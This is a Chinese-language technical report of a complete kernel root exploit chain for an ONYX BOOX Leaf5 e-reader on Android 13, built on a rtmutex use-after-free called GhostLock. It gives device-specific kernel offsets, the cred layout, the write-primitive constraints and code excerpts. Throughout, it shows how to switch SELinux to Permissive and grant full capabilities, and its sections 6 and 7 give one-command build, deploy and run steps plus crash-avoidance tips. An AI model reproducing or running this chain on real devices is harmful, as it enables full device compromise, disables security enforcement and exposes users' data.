# 从 root：Leaf5 GhostLock 完整利用链

> **文档类型**: 技术报告 | **状态**: 已达成完整 root
> **漏洞**: **CVE-2026-43499**（GhostLock）—— `rtmutex` 栈 use-after-free，触发面 `FUTEX_CMP_REQUEUE_PI`
> **设备**: ONYX BOOX Leaf5 | **系统**: Android 13（SDK 33）/ ONYX 固件 `4.2.3-rel_0928_656b72278`（incremental 634）
> **内核**: `4.19.157-perf-g77c132eccfab-dirty` #38 SMP PREEMPT（Tue Jul 28 10:48:06 CST 2026）| **ABI**: arm64-v8a | **SoC**: `lito`

---

## 0.1 环境基线

本文每一个偏移、每一条崩溃地址都绑在这台机器的这一版系统上。换机或换固件后不成立。

| 项 | 值 |
|----|-----|
| 漏洞 | **CVE-2026-43499**（GhostLock），`rtmutex` 栈 UAF |
| 型号 | Onyx BOOX Leaf5（`ro.product.model=Leaf5`，`ro.product.brand=Onyx`） |
| Android | 13 / API 33（`ro.build.version.release` / `.sdk`） |
| ONYX 固件 | `4.2.3-rel_0928_656b72278`，incremental 634（`ro.build.display.id`） |
| 固件构建 | 2026-09-28 15:24:08 HKT |
| 系统指纹 | `ONYX/TabBoox/TabBoox:13/TKQ1.230615.001/GV2.027.SQ83A:user/release-keys` |
| 内核版本 | `4.19.157-perf-g77c132eccfab-dirty` **#38** SMP PREEMPT |
| 内核构建 | Tue Jul 28 10:48:06 CST 2026，clang 10.0.7 for Android NDK |
| SoC / ABI | `lito` / `arm64-v8a` |
| `/system` | `/dev/block/dm-8`，dm-verity，只读 |
| `/data` | 挂载含 `nosuid` |

> 「#38」是本仓库的唯一基准。所有 `target.h` 偏移、`0x40a01cf` 这个掩码尾、
> `GETUID_CRED_OFF_LO=0x0de7d4` 都只在 #38 上验证过。

---


## 0. 这份文档怎么读

正序文档（README、各个 stage 的 README）回答的是"先做什么、再做什么"。
本文反过来：**先摆出最终达成的状态，然后一层一层问"要达到这个，上一步必须是什么"。**

这样写的原因很实际 —— 这条链上绝大多数失败**不是缺步骤，而是多做了事**：
多加一轮、多 join 一次、多 fork 一次、多写一个字段，都会 panic。
正着读会以为每一步都是"我主动选的方案"，倒着读才能看出每一步都是**被下层约束逼出来的唯一解**。

每一层结尾有 `⇒ 结论`，可以只读结论串起来。

---

## 1. 结果（倒推的起点）

### 1.1 实测输出

设备 root 后，`su -c` 的实测结果（B410，2026-10-29）：

```
$ /data/local/tmp/su -c "id"
uid=0(root) gid=0(root) context=u:r:shell:s0

$ /data/local/tmp/su -c "grep -E '^Cap' /proc/self/status"
CapInh: 0000002d049201cf
CapPrm: 0000002d049201cf
CapEff: 0000002d049201cf
CapBnd: ffffffa4d2b201cf
CapAmb: 0000002d049201cf

$ /data/local/tmp/su -c "touch /data/local/tmp/root_ok && echo TOUCH_OK"
TOUCH_OK

$ /data/local/tmp/su -c "mount -t tmpfs tmpfs /data/local/tmp/m && echo MOUNT_OK"
MOUNT_OK                      # 仅当掩码 bit21=1 时；见 §3.4

$ getenforce
Permissive
```

### 1.2 这几个数字分别在说什么

| 观测量 | 值 | 含义 |
|--------|-----|------|
| `uid` | 0 | `cred->uid/euid/suid/fsuid` 四个字段全部归零 |
| `CapEff` | `0x2d049201cf` | **execve 之后**仍然有 37 位能力，不是 `0xc0` |
| `CapBnd` | `0xffffffa4d2b201cf` | bounding set 被抬到接近满值，子进程不会再被截断 |
| `CapAmb` | 非 0 | ambient 已 raise，setuid 程序也能拿到能力 |
| `getenforce` | Permissive | `selinux_state.enforcing`（+0x1）被写成 0 |
| `CapEff & (1<<21)` | 取决于 KASLR | `CAP_SYS_ADMIN` 在或不在，见 §3.4 |

**关键点：`CapEff` 是 execve 之后的读数。**
进程内 `setresuid(0,0,0)` 拿到的 uid=0 只值"半 root"——
`execve` 一发生，`cap_bprm_creds_from_file()` 会按文件重算 `pP'`，
之前写进 `cap_permitted` 的东西一位都留不下（§3.2）。
所以"`CapEff` 在 execve 后仍然非 0"才是这条链真正跨过的门槛。

### 1.3 ⇒ 结论

```
目标 = (uid=0) ∧ (execve 后 CapEff ⊇ 需要的能力集) ∧ (SELinux Permissive)
```

`execve 后` 这三个字是整条链的分水岭。所有设计决策都从它倒推出来。

---

## 2. 第一层倒推：为什么掩码必须是"整片"，而不是 `0x1cf`

### 2.1 先看 `0x1cf` 能不能行

`0x1cf` = bit0/1/2/3/6/7/8 =
`CAP_CHOWN | CAP_DAC_OVERRIDE | CAP_DAC_READ_SEARCH | CAP_FOWNER | CAP_SETGID | CAP_SETUID | CAP_SETPCAP`。

这一组足够 `setresuid(0,0,0)`、足够读 `/data/misc`、足够写 `/data/local/tmp`。
B405 就是这么过的：`execve` 后 `CapEff=00000000000001cf`，`TOUCH_OK`。

**但它不够 `mount`。** `CAP_SYS_ADMIN` 是 bit21，`0x1cf` 里没有。
B405 的 `mount -t tmpfs` 返回 EPERM。

### 2.2 掩码从哪来 —— 这不是随便填的数

写入值是：

```c
/* exploit/src/fops.c:364 */
*v = (uintptr_t)text_addr(KIMAGE_TEXT_BASE + BSS_LOWZERO_SCRATCH_OFF + 0x1cf);
```

展开：

```
KIMAGE_TEXT_BASE          = 0xffffff8008080000   (target.h:58, 链接期 _text)
BSS_LOWZERO_SCRATCH_OFF   = 0x040a0000           (target.h:169, .bss 全零垫片)
+ 0x1cf
------------------------------------------------
链接期地址                 = 0xffffff800c1201cf
低 32 位                   = 0x0c1201cf
```

掩码就是这个指针的**低位**。为什么低位能当掩码用，见 §5.3 ——
因为写原语是"把指针当值存"，我们选了一个"低 9 位刚好等于想要的 cap 集"的地址。

### 2.3 `0x1cf` 这个尾巴为什么抬不上去

想要 bit21，就得让低位含 `0x200000`。可选做法只有两个：

1. **换垫片偏移**：把 `+0x1cf` 改成 `+0x2001cf`。
   ⇒ 但 `0x2001cf` 的低 9 位是 `0x1cf`，**多出来的 bit21 落不进 cap 字段**。
   `cap` 字段只有低 37 位有效（`CAP_LAST_CAP=37`），bit21 在有效范围内 ——
   问题不在位宽，在于 `0x2001cf` 这个地址**低 21 位**是 `0x2001cf`，
   把它当掩码用时 bit21 确实是 1 —— 但同一批位还带上了 bit13..bit20 之外的垃圾吗？
   没有，`0x2001cf` 干净。**真正的障碍是下面这一条。**

2. **`0x2001cf` 这个地址在 .bss 里不存在可读页**。
   shape0 的写原语会执行 `ldr x10,[x9,#0x10]`（§5.2），把载荷当指针**解引用一次**。
   载荷必须是"可读 + 低 9 位对"的内核地址。
   `BSS_LOWZERO_SCRATCH_OFF + 0x1cf = 0x040a01cf` 落在 .bss 低零页，可读。
   再加 `0x200000` 就是 `0x042a01cf` —— 那个位置不保证映射。
   B396 试过，`ldr` 立刻 fault。

3. **改成 shape6 直接写 `0x3fffffffff`**（不经指针解引用）。
   B398 / B400 两次实测：paint 之后**必崩**。见 §8「避坑 P5」。路封死。

**剩下的唯一办法：不动 `+0x1cf`，把 KASLR slide 算进来。**

### 2.4 KASLR 给了另一半

`text_addr()` = 链接期地址 + slide，slide 是 2MB 对齐的正数。
掩码的低 32 位 = `0x0c1201cf + slide`（进位先忽略，实测未跨 4GB）。

`slide` 对 4MB 取模只有两种可能（slide 是 2MB 的整数倍）：

| `slide mod 4MB` | 掩码低位 | bit21 |
|-----------------|----------|-------|
| `0` | `0x1201cf` | **0** |
| `0x200000` | `0x3201cf` | **1** ← CAP_SYS_ADMIN |

推导：`0x0c1201cf mod 0x400000 = 0x1201cf`；`0x1201cf + 0x200000 = 0x3201cf`。
`0x1201cf < 0x200000` ⇒ bit21=0；`0x3201cf ≥ 0x200000` ⇒ bit21=1。

**所以 `CAP_SYS_ADMIN` 是抽签，不是配置。** 大约一半的 boot 有，一半没有。

### 2.5 ⇒ 结论

```
要在 execve 后拿到 CAP_SYS_ADMIN：
  · 不能改 +0x1cf（改了就不可读 / 就崩）
  · 不能指望 shape6 直接写大整数（必崩）
  ⇒ 只能等一个 slide mod 4MB == 0x200000 的 boot
  ⇒ 单次成功率再乘 1/2
```

实测对照：

| 轮次 | `bnd=` | bit21 | mount |
|------|--------|-------|-------|
| B405 | `ffffffaf5c1201cf` | 0 | EPERM |
| B406 | `ffffffa4d2b201cf` | 1 | **OK** |
| B407 | `ffffffa4d2b201cf` | 1 | OK |
| B410 | `ffffffa4d2b201cf` | 1 | OK |

> 判断 bit21 必须看 **route 日志里 `round 3 caps ... bnd=`**，
> **不要看 execve 后的 `CapEff`** —— 那个是 inheritable 的镜像（§3.3），
> 曾经因此连续误判两轮。

---

## 3. 第二层倒推：为什么要三轮，而且三轮必须落在同一块 `cred` 上

### 3.1 三个字段，三次写

`struct cred` 布局（`commit_creds` / `cap_capset` 反汇编核过，`task.h` 交叉验证）：

```
+0x00  usage(4B)  uid(4B)       +0x30  cap_permitted
+0x04  gid                      +0x38  cap_effective
+0x08  suid                     +0x40  cap_bset
+0x0c  sgid                     +0x48  cap_ambient
+0x14  euid   +0x1c fsuid       +0x78  security
```

目标状态需要三个字段：

| 字段 | 目标 | 为什么 |
|------|------|--------|
| `cap_permitted` (+0x30) | 整片 | `capset` 的硬约束 `prm' ⊆ old_prm`，不先抬就无法 `capset` 任何东西 |
| `cap_bset` (+0x40) | 整片 | bounding set 限制 `execve` 后能保留哪些位 |
| `selinux_state.enforcing` | 0 | 否则 `capable()` 之后还有一次 LSM 检查 |

### 3.2 为什么不能一发 write 全写完

写原语的能力边界：**一次 route 只能落两个 8 字节 store**，
而且这两个 store 的地址/值被 rb-tree 的形状锁死（§5.2）——
一次 route 只能表达"一个 target、一个 value"。
三个字段是三个不同地址，**没有一条 shape 能把它们塞进同一轮**。

### 3.3 为什么 `cap_permitted` 抬了还不够 —— pP' 落在 inheritable 上

这是本机最反直觉的一条。B405 实测：

```
写入前: prm = 0xffffffaf5c1201cf   (整片)
execve 后: CapEff = 0x00000000000001cf
```

按上游代码/文档的通用理解，`cap_bprm_creds_from_file()` 走 legacy-root 分支时
`pP' = cap_combine(old->cap_bset, old->cap_inheritable)`，
bset 已经整片，`pP'` 应该是整片。**但实测不是。**

反查 `CAPS_FULL_FINISH` 的 `capset` 参数才发现：execve 后 `CapEff`
**正好等于 capset 传进去的 inheritable**。也就是说这个内核上
`pP'` 实际取的是 `inheritable`，`permitted` 的高位不参与。

⇒ **inheritable 必须等于整片掩码，不能是 `0x1cf`。**

两条代码修正（缺一不可，B406）：

```c
/* exploit/src/main.c:2719 */
{prm_now, prm_now, prm_now, "inh=prm(full mask)"},   /* inh 从 0x1cf 改成 prm_now */

/* exploit/src/main.c:2765 */
int cs = caps_set(full, full, full);                  /* 原来是 caps_set(0x1cf, ...) */
```

第二条才是真凶：`main.c:2744` 那行在 `setresuid` **之后**又把 inheritable
按回 `0x1cf`，execve 继承的就是它。改完：

```
CapInh: 00000024d2b201cf
CapPrm: 00000024d2b201cf
CapEff: 00000024d2b201cf      ← 整片
```

### 3.4 为什么三轮共用一个进程，而且必须是**同一块** `cred`

三轮如果各在自己的 cred 上写，等于什么都没做：

- round 1 写 `selinux_state`（全局，不看 cred）
- round 2 写 `cred_A->cap_permitted`
- round 3 写 `cred_B->cap_bset`

结果：没有任何一份 cred 同时具备 prm+bset。`execve` 用的是**进程主线程的 cred**，
而它可能一份都没被写过。

⇒ 三轮必须写**同一个 `perf_cred_ptr`**，即主线程的 cred 地址。

### 3.5 `perf_cred_ptr` 是怎么来的 —— 不需要额外工作

`PERF_CRED=1` 起一个 `perf_event_open` + `PERF_SAMPLE_REGS_INTR` 采样，
在 `sys_getuid` 的 `ldr x8,[x8,#0x7e0]` **之后**（`+0x0de7d4`）中断，
此时 `x8` 恒为 `current->cred`。

```
GETUID_CRED_OFF_LO = 0x0de7d4    /* 不是 0x0de7d0 */
```

`0x0de7d0` 是 `ldr` 本身，停在那条上时 `x8` 还是 `task` —— B368 现场
`perf task` 与 `perf cred` 同址（`fffffff22a856740`），写入落到 `task+0x30`，
`capset` 全 EPERM。这是踩过的坑，见 §8「避坑 P9」。

### 3.6 ⇒ 结论

```
要 execve 后 CapEff 整片：
  ⇒ CapInh / CapPrm / CapBnd 都必须是整片
  ⇒ 三个字段三次写（写原语一轮只能表达一个 target/value）
  ⇒ 三次写必须落在同一块 cred（execve 用主线程的 cred）
  ⇒ 必须是"主线程的 cred"，不能让子进程 / fork 出来的 cred 顶上
```

---

## 4. 第三层倒推：为什么载体必须是**新线程**，而且必须常驻

这一层是整条链上 bug 最密集的地方。三个"不能用"逼出了唯一解。

### 4.1 不能用"同一线程连做两轮"

实测五次（B217 / B238 / B255 / B349 / B371）全部：

```
kernel BUG at kernel/locking/rtmutex_common.h:60
BUG_ON(w->lock != lock)
pc: rt_mutex_adjust_prio_chain+0x830
```

原因：每轮 route 都会把 fake `rt_mutex` **画在自己的内核栈上**，
`f_pi_chain` 上留一个 waiter 指向它。
同一个线程的第二轮重建时，`rt_mutex_enqueue` 会遍历到上一轮那个假 rb_node，
而它的 `w->lock` 指向第一轮的栈帧（已被第二轮覆盖）⇒ 断言炸。

⇒ **每轮必须有一个"干净"的 task（自己的 `pi_waiters` 树）**。

### 4.2 不能用 `fork()` 出来的子进程

`fork()` 走 `copy_creds()` 的**非** `CLONE_THREAD` 分支 ⇒ `prepare_creds()` ⇒ **复制**一份 cred。
子进程写的是它自己那份，主进程的 cred 一位不动。
B380 实测：子进程写得很成功，父进程 `capset` 仍然 EPERM，而且子进程的 route
踩到了父进程留下的 stack-lock，直接 panic。

⇒ **必须是 `copy_creds()` 不复制 cred 的那条分支。**

### 4.3 唯一满足两条约束的载体：`CLONE_THREAD` 线程

```c
/* kernel/cred.c, copy_creds() */
if (clone_flags & CLONE_THREAD) {
    atomic_inc(&p->cred->usage);      /* 只 get_cred，不复制 */
    ...
}
```

线程：
- **共享 cred** —— 线程里写的 `perf_cred_ptr` 就是主线程正在用的那一块 ✔
- **有自己的 `task_struct` / 内核栈 / `pi_waiters`** —— 上一轮的悬垂 waiter 不在它的树上 ✔

两者同时成立，这是唯一解。

### 4.4 线程跑完不能退出 —— 必须 `for(;;) pause()`

B404 实测：`route_round_thread()` 里 `run_main_route_threads()` 返回后
`return NULL` + `pthread_join()`，第三轮在开始前崩：

```
Unable to handle kernel NULL pointer dereference
pc: lpm_cpuidle_enter+0x414/0x498
```

原因：`pthread_join()` 之后线程栈被 glibc 回收/复用，
而 `f_pi_chain` 上（以及 `runtime` 的某个 rbtree 上）还留着指向那块栈的 waiter。
栈被别的线程拿去用 ⇒ 内核在 idle 路径上走到野 `rt_mutex`。

修法（`exploit/src/main.c:1383`）：

```c
static void *route_round_thread(void *arg) {
  (void)arg;
  run_main_route_threads();
  g_rr_done = 1;
  for (;;) pause();          /* 永不返回：栈页不能被回收 */
  return NULL;
}
```

调用端（`main.c:2088`）：

```c
pthread_detach(rrth);        /* 不能 join */
while (!g_rr_done) usleep(1000);
```

### 4.5 ⇒ 结论

```
要三轮各写一个字段且都落在主线程的 cred 上：
  ⇒ 每轮一个新 task（避开 rtmutex_common.h:60）
  ⇒ 该 task 必须共享 cred（避开 fork 的 cred 复制）
  ⇒ ⇒ 只能用 CLONE_THREAD 线程
  ⇒ 该线程跑完必须常驻（避开栈回收 → lpm_cpuidle_enter）
  ⇒ 必须 detach + 轮询标志，不能 join
```

这四条串起来，就是 `THREAD_RACE=1 ROUTE_ROUNDS=3` 的全部理由。

---

## 5. 第四层倒推：写原语本身

### 5.1 根因（CVE-2026-43499 / GhostLock）：`remove_waiter()` 用 `current` 顶替 `waiter->task`

```c
/* kernel/locking/rtmutex.c（4.19） */
static void remove_waiter(struct rt_mutex *lock, struct rt_mutex_waiter *waiter)
{
    ...
    rt_mutex_dequeue(lock, waiter);
    current->pi_blocked_on = NULL;      /* ← 用的是 current，不是 waiter->task */
    ...
}
```

正常路径下 `waiter->task == current`，所以这行等价。
但 GhostLock 造出的场景是：`waiter` 是一个**悬垂/伪造**的结构，
`waiter->task` 指向别处，而 `current` 是我们控制的另一个 task。
于是清理动作落在 `current` 的 `pi_waiters` 树上，而那棵树里塞着我们的假 rb_node。

### 5.2 `rb_erase_cached` 变成两次 store

`rt_mutex_dequeue()` 里两次 erase 用的是同一份被 paint 过的内核栈：

```
① rb_erase_cached(&waiter->tree_entry, &lock->waiters)   → 读 w[0..2]
② rb_erase_cached(&waiter->pi_tree,    &task->pi_waiters) → 读 w[3..5]
```

两次调用之间只隔几条指令。我们通过 sigreturn 帧把 `w[0..9]` 画成想要的值，
于是 erase 的**再平衡路径**被引到 shape0 的 `+0x80`：

```asm
; rt_mutex_adjust_prio_chain 附近，cas2/tree fixup 内联展开
+0x78  ldr  x10,[x0]         ; x10 = w[0] = value
+0x7c  ands x9,x10,#~3       ; x9 = parent = value & ~3
+0x80  str  x10,[x8]         ; *(target) = value        ← 目标写
+0x88  ldr  x10,[x9,#0x10]   ; ★ 把 value 当指针读一次 ★
+0x94  str  x8,[x9,#8]       ; *(value+8) = target
```

三条硬约束直接从这段推出：

1. **`target` 必须 8 字节对齐** —— `str x10,[x8]` 非对齐会 alignment fault，
   直接 oops。B237/B239/B240 都栽在这（载荷 `0x..00c2`）。
2. **`value` 必须是可读内核地址** —— `+0x88` 会解引用。这就是
   "垫片地址 + 低位掩码"这个构造存在的原因（§2.2）。
3. **`value+8` 会被写坏** —— `fops` 那一路必须用 shape2 而不是 shape0，
   否则被写坏的是 `fake_fops->owner`，`fops_get()` 的 `try_module_get()`
   会对一个 .data 地址做 atomic inc/dec，几百毫秒内 panic（B250/B252/B254）。

### 5.3 为什么"指针低位"能当 cap 掩码

`str x10,[x8]` 存的是 `x10` 的**完整 64 位**。
我们把 `x10` 设成 `0xffffff800c1201cf`，最终 `cred->cap_permitted`
就是 `0xffffff800c1201cf`。

`cap` 字段只用低 37 位，高位是垃圾——但**无害**：

- `cap_capset()` 的判据是 `cap_issubset()`，按位与，高位不影响低位
- `cap_bprm_creds_from_file()` 里 `pP' = ... & CAP_FULL_SET`，高位被自动裁掉
- 实测 `CapEff: 0000002d049201cf` —— 高位没了，低位全在

所以"掩码 = 一个可读 .bss 地址的低位"是可行的，
而"掩码 = 一个干净的 `0x3fffffffff`"反而做不到，因为写原语要求值同时是指针。

### 5.4 `selinux_state` 那一轮走 shape0，正好

`selinux_state` 是 `.bss` 里的全局结构，`enforcing` 在 `+0x1`。
写 8 字节 `0xffffff800c120000` 进去，低字节全 0 ⇒ `enforcing = 0`。
value 是 `BSS_LOWZERO_SCRATCH_OFF + 0`（8 字节对齐、可读、全零）⇒ 三条约束全满足。

B251 起四次验证干净，是整条链里最稳的一发。

### 5.5 ⇒ 结论

```
写原语 = rb_erase_cached 再平衡路径上两次 store
硬约束：
  · target 8 字节对齐
  · value 必须是可读内核地址（shape0）
  · value+8 会被写坏（所以 target/value 的选择要考虑这个副作用）
  · 一轮只能表达一个 (target, value)
```

---

## 6. 正确线路（汇总）

```
┌─ 前置 ─────────────────────────────────────────────────────────┐
│ uptime ≥ 90s        （否则 perf 采样与 route 时序全乱，见 C1）   │
│ SELinux 状态任意     （round 1 负责关掉）                        │
│ preload.so 已推送     （LD_PRELOAD 挂在 /system/bin/sleep 上）    │
└────────────────────────────────────────────────────────────────┘
                             │
        ┌────────────────────┴────────────────────┐
        │  LD_PRELOAD=./preload.so sleep 480      │
        │  constructor 在 shell 上下文里跑         │
        └────────────────────┬────────────────────┘
                             ▼
  ① KSNITCH              内核基址 / slide          (SKIP_LEAK=1 时跳过，走已知 slide)
  ② PERF_TASK            泄漏 current 的 task_struct
  ③ PERF_CRED            泄漏 current->cred 地址    → perf_cred_ptr
  ④ STACK_LOCK           在自身上下文里种下 fake rt_mutex
  ⑤ PARENT_PAINT         sigreturn 帧把 waiter 十个 word 画到内核栈上
  ⑥ RB_LEFTMOST_PAD=1    让 erase 落进 case1(+0x78)，即 §5.2 那段
                             │
        ┌────────────────────┴────────────────────┐
        │  round 1 (主线程)                        │
        │    WRITE_PLAN[0] = selinux               │
        │    *(selinux_state) = .bss 低零垫片      │
        │    → enforce 0，系统不重启                │
        ├──────────────────────────────────────────┤
        │  round 2 (新线程 A，跑完 pause 常驻)      │
        │    WRITE_PLAN[1] = prmptr                │
        │    *(cred+0x30) = kbase+0x40a01cf        │
        │    → cap_permitted 整片                  │
        ├──────────────────────────────────────────┤
        │  round 3 (新线程 B，跑完 pause 常驻)      │
        │    WRITE_PLAN[2] = bsetptr               │
        │    *(cred+0x40) = kbase+0x40a01cf        │
        │    → cap_bset 整片，bnd= 出现在日志里     │
        └────────────────────┬────────────────────┘
                             ▼
  ⑦ CAPS_FULL_FINISH     capset(full,full,full) → ambient raise
                         → setresuid(0,0,0) → 再 capset 一次
                             │
                             ├─ exec_probe.txt   ← 子进程 execve 后回读能力
                             ▼
  ⑧ FAST_ROOT            euid=0，装 /data/local/tmp/su + 起 daemon
                             │
                             ▼
  ⑨ 校验                 su -c "id" → uid=0
                         CapEff ≠ 0xc0
                         touch → TOUCH_OK
                         (可选) mount → MOUNT_OK
```

### 6.1 一条命令跑完

```bash
# 1. 编译
make exploit

# 2. 推设备
./scripts/deploy.sh

# 3. 跑（最多 3 次，成功即停）
./scripts/root_try.sh 3

# 要 CAP_SYS_ADMIN（mount 能力）再加一层筛选，平均多跑一倍次数
REQUIRE_SYSADMIN=1 ./scripts/root_try.sh 8
```

### 6.2 等价的环境变量（手工跑时用）

```bash
SKIP_LEAK=1 PERF_CRED=1 PERF_TASK=1 \
WRITE_PLAN=selinux,prmptr,bsetptr THREAD_RACE=1 ROUTE_ROUNDS=3 \
STACK_LOCK=1 PARENT_PAINT=1 CAPS_FULL_FINISH=1 FAST_ROOT=1 INPROC_SU=1 \
PSELECT_ROUTE_ATTEMPTS=2 PAGE_SETUP_ATTEMPTS=1 MM_SPRAY_SLABS=0 \
LD_PRELOAD=./preload.so /system/bin/sleep 480
```

参数全表见 [`PARAMS.md`](PARAMS.md)。

### 6.3 时间账（实测）

| 环节 | 耗时 |
|------|------|
| 单轮 chain（成功） | **96 秒**（B410，起跑 uptime=101s） |
| 单轮 chain（失败） | ~3.5 分钟（含 panic 重启后的等待） |
| reboot 后等就绪 | +100 秒（`MIN_UP=90` + 20 秒余量） |
| 三次重试全部失败 | ~10 分钟 |

---

## 7. 避坑：每条都死过一次

按"死得多惨"排序。每条给：现象 / 归因 / 结论。

### P1 `pthread_join` 之后线程 return —— 三轮必崩第三轮

```
Unable to handle kernel NULL pointer dereference at virtual address 0000000000000000
pc : lpm_cpuidle_enter+0x414/0x498
Call trace:
  lpm_cpuidle_enter
  cpuidle_enter_state
  do_idle
```

归因：线程栈被回收，`f_pi_chain` 上的 waiter 指向野地址。
修法：`for(;;) pause()` 常驻 + `pthread_detach`。
（`main.c:1383`、`main.c:2096`）

### P2 同一线程连做两轮

```
kernel BUG at kernel/locking/rtmutex_common.h:60!
BUG_ON(w->lock != lock)
pc: rt_mutex_adjust_prio_chain+0x830
```

归因：第一轮留在 `lock->waiters` 里的假 rb_node 还在树上。
修法：每轮新线程（`THREAD_RACE=1`，`main.c:2088`）。

### P3 `fork()` 做第二轮

子进程 `prepare_creds()` 复制了 cred，写的是副本；
同时踩到父进程留下的 stack-lock ⇒ panic。B380。
修法：只用 `CLONE_THREAD`。

### P4 `PSELECT_ROUTE_DELAY_USEC` 压到 90/60

```
kernel BUG at kernel/locking/rtmutex_common.h:60
pc: rt_mutex_adjust_prio_chain+0x830
```

B319/B320/B321 三连崩。这个参数是**时序**，不是"等多久"：
`delay=0` 时 `adjust_prio_chain` 第一次读 `waiter->lock` 读到的是旧值，
与 chain 里第二次读（已被 pselect 的 `fd_set` 拷贝覆盖）不等 ⇒ `b.ne +0x70c` 退出。
必须让 pselect 先进内核完成 `copy_from_user`。
⇒ **`delay=150` 是已验证值，不要动。**

### P5 shape6（直接写大整数）必崩

B398 / B400：paint 之后立即 panic，`w[1]` 被别的路径当指针。
`WRITE_PLAN=prm` / `bset` / `eff` 走的就是 shape6 —— 保留但**不要当默认**。
⇒ 用 `prmptr` / `bsetptr`（shape0）代替。

### P6 `cred = &init_cred`

B372 / B381 / B385 三次全崩 `lpm_cpuidle_enter`。
`init_cred` 是全局的，被 idle 线程共享 ⇒ 改了它等于改所有 idle 线程的 cred。
⇒ 放弃。

### P7 `modprobe_path` / `core_pattern` 改完不执行

```
$ cat /proc/sys/kernel/modprobe       # 改成功了
$ cat /proc/sys/kernel/core_pattern   # 改成功了
$ <触发>                              # 什么都不发生
```

反汇编 `call_usermodehelper_setup`（`0xffffff80080e28c0`）发现
`stp x8,x23,[x0,0x38]` 存的是硬编码静态串 `0xffffff800b1b02ca`，
内容是**空串**（首字节 `0x00`）。
`call_usermodehelper_exec` 在 `0xffffff80080e2e7c` 处 `cbz x0` 直接跳到 `out_sleep`。

⇒ `CONFIG_STATIC_USERMODEHELPER=y` + 静态串为空 ⇒ 这条路**一次都不会跑**。
B384 在这里浪费了整轮。整条 usermodehelper 路径封死。

### P8 `0xc0` 不够，要 `0x1cf`（乃至整片）

`0xc0` = `CAP_SETGID|CAP_SETUID`。`setresuid` 成功、uid 变 0，
但写 `/data/local/tmp/su` 拿到 **EACCES(13)**。
`/data/local/tmp` 是 `0771 shell:shell`，uid 0 不是 owner，
root 的越权豁免走 `capable(CAP_DAC_OVERRIDE)`，bit1 没置 ⇒ 拒。
⇒ 至少 bit0/1/2，实际用整片（§2）。

### P9 `perf_cred_ptr` 落到 task 上

```
[perf] task fffffff22a856740
[perf] cred fffffff22a856740     ← 同址 = 采错了
```

归因：`GETUID_CRED_OFF_LO = 0x0de7d0` 是 `ldr x8,[x8,#0x7e0]` **本身**，
停在那条上时 `x8` 还是 `task`。
⇒ 改成 `0x0de7d4`（`ldr` 之后），并加 `v != perf_task_ptr` 兜底。

### P10 cred 采信票数门槛

高负载下同一个地址的票数会低到 4/9（B370 四次都是同一地址）。
原判据"票数 ≥ 20 才采信"造成假阴性。
⇒ 与 task 同一条判据：**跨 attempt 地址一致即采信**。

### P11 设备 reboot 后 uptime < 90s 就跑

```
T1519_1  uptime=31s → 崩在 round 1 刚起步（连 perf 采样都没出）
T1522_2  uptime=31s → 同上
T1524_3  uptime=29s → 同上
T1527_1  uptime=131s → 成功
B405/B406/B407       → 设备已跑十几分钟，全成功
```

⇒ `MIN_UP=90`，且**设备本来就活着就直接用、不重启**。

### P12 `NO_IDLE`（自旋占核）是负优化

7 个 `while(!stop) asm("")` 线程把 loadavg 推到 12，adb 处处超时，
单轮 535 秒，且成功率没改善（B408 照样崩 round 2）。
⇒ 默认关（`NO_IDLE=0`）。

### P13 监控循环等满 timeout 才收工

`run_chain.sh` 原来只在 exploit 进程自然结束时 `break`。
exploit 本体是 `sleep 480`，成功后还要等满 480 秒才能拿到 `END`。
B409 实测：`FAST_ROOT daemon pid=19792` 在第 40 秒就出来了，循环空转到 540 秒。

修法（`scripts/run_chain.sh`）：

```bash
case "$(D "grep -c 'FAST_ROOT daemon' $RUNLOG 2>/dev/null")" in
  0|"") ;;
  *) say "  daemon 已起，提前收工"; break;;
esac
```

⚠ **不能用 `tail -3`** —— daemon 之后 3 秒内又打出 4 行，轮询正好错过。

### P14 `build_preload.sh` 内嵌 su 只在文件不存在时编

改了 `su_daemon.c` 之后 `.incbin` 进去的还是旧二进制，日志里 daemon 打旧路径，
极容易误判成"改动没生效"。⇒ 无条件重编。

### P15 `/data/local/tmp` 0771 ⇒ daemon bind EACCES

daemon 是 `execve` 起来的，`cap_permitted=0` ⇒ 新进程 `CapEff=0`，
既不是 owner 也没有 `DAC_OVERRIDE`，`bind()` 直接 EACCES。
⇒ `/data/local/tmp/su_root`（`root:root 0777`）由 exploit 侧建好（此时有 `DAC_OVERRIDE`），
daemon 只在里面 bind。

### P16 `/system` 写不进去

```
/dev/block/dm-8 / ext4 ro,seclabel,nodev,relatime
mount -o rw,remount /          → rc=0，但仍 ro
blockdev --setrw /dev/block/dm-8 → '/dev/block/dm-8' is read-only
```

`/system` 是 dm-verity 保护的 dm-linear 层。有 `CAP_SYS_ADMIN` 也 remount 不动。
⇒ 持久化只能做到"重启后一条命令恢复"。

### P17 `/data` 是 `nosuid`

`chmod 4755 /data/local/tmp/su` 永远无效（`nosuid` 挂载选项）。
⇒ 不能靠 setuid 位，只能靠 daemon 常驻 + socket。

---

## 8. 约束（硬限制，不是调优项）

| # | 约束 | 来源 | 影响 |
|---|------|------|------|
| **C1** | 起跑时 `uptime ≥ 90s` | 三次实测崩在 round 1 | 每次 reboot 后必须等 |
| **C2** | `PSELECT_ROUTE_DELAY_USEC=150` | `rtmutex_common.h:60` | 不能压小，不能按 load 自适应 |
| **C3** | `PSELECT_ROUTE_NFDS > 320` | `core_sys_select` 小 nfds 走栈内 fd_set，会把 waiter memset 掉 | 固定 640 |
| **C4** | 写原语 target 必须 8 字节对齐 | `str x10,[x8]` 非对齐 = alignment fault | 载荷偏移只能取 8 的倍数 |
| **C5** | 三轮必须新线程 + 常驻 | §4 | `THREAD_RACE=1` 不可省 |
| **C6** | 三轮必须同进程 | cred 共享 | 不能拆成三个进程 |
| **C7** | `CAP_SYS_ADMIN` 由 KASLR 抽签 | 掩码低位 = `kbase+0x40a01cf` | 约 1/2 概率；`REQUIRE_SYSADMIN=1` 可筛选 |
| **C8** | 单轮成功率 ~2/3 | 失败集中在 round 2/3 的 rtmutex 断言 | 3 次重试 ≈ 96% |
| **C9** | SELinux 重启回 Enforcing | round 1 负责关 | 每次 reboot 都要重跑 |
| **C10** | `/system` 只读（dm-verity） | dm-linear 层 | 不能持久化到系统分区 |
| **C11** | `/data` 是 `nosuid` | 挂载选项 | setuid 位无效 |
| **C12** | `CONFIG_STATIC_USERMODEHELPER=y` 且静态串为空 | 反汇编 `call_usermodehelper_setup` | `modprobe_path` / `core_pattern` 全封死 |
